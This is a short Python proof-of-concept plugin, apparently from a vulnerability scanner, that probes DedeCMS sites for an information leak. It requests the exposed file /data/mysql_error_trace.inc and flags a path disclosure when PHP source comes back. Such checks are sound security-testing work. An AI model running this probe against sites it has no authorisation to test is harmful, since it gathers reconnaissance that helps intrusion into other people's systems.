#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms trace爆路径漏洞
referer: http://0daysec.blog.51cto.com/9327043/1571372
author: Lucifer
description: 访问mysql_error_trace.inc,mysql trace报错路径泄露。
'''
import HackRequests

def poc(arg, **kwargs):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/data/mysql_error_trace.inc"
    vulnurl = arg + payload
    hh = HackRequests.hackRequests()
    try:
        r = hh.http(vulnurl,headers=headers)

        if r.status_code == 200 and r"<?php" in r.text():
            result = {
                "name": "dedecms mysql trace",  # 插件名称
                "content": "访问mysql_error_trace.inc,mysql trace报错路径泄露。",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": r.log,
                "tag": "info_leak"  # 漏洞标签
            }
            return result

    except:
        return False
